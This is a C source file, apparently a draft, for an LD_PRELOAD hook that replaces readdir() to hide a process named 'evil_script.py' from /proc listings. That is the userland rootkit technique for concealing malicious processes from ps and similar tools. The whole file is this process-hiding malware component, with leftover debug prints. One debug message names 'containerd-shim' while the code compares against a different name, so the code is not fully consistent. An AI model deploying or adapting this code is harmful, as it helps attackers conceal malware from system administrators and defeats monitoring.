#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>     
#include <dlfcn.h>      
#include <string.h>
#include <regex.h>

typedef struct dirent* (*original_readdir_t)(DIR *dirp);

struct dirent* readdir(DIR *dirp) {
    static original_readdir_t original_readdir;
    static int call_count = 0;
    
    if (!original_readdir) {
        original_readdir = (original_readdir_t)dlsym(RTLD_NEXT, "readdir");
        if (!original_readdir) {
            fprintf(stderr, "Error getting original readdir: %s\n", dlerror());
            return NULL;
        }
    }

    struct dirent* dir = original_readdir(dirp);
    call_count++;
    printf("readdir called %d times\n", call_count);
    
    if (dir == NULL || dir->d_name[0] < '0' || dir->d_name[0] > '9') {
        return dir;
    }

    char path[256];
    char buffer[256];
    regex_t regex;
    regmatch_t matches[2];

    if (regcomp(&regex, "\\(([^)]*)\\)", REG_EXTENDED) != 0) {
        return dir;
    }

    snprintf(path, sizeof(path), "/proc/%s/stat", dir->d_name);
    FILE *fp = fopen(path, "r");
    if (fp != NULL) {
        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
            printf("Process stat: %s", buffer);
            
            if (regexec(&regex, buffer, 2, matches, 0) == 0) {
                int start = matches[1].rm_so;
                int end = matches[1].rm_eo;
                char process_name[256] = {0};
                strncpy(process_name, buffer + start, end - start);
                
                printf("Process name: %s\n", process_name);
                printf("Length of process name: %ld\n", strlen(process_name));
                printf("Comparing with 'containerd-shim'\n");
                
                // Use exact string comparison
                if (strcmp(process_name, "evil_script.py") == 0) {
                    printf("Found match! Skipping process: %s\n", dir->d_name);
                    fclose(fp);
                    regfree(&regex);
                    return original_readdir(dirp);  // Get next entry
                }
            }
        }
        fclose(fp);
    }
    regfree(&regex);
    return dir;
}

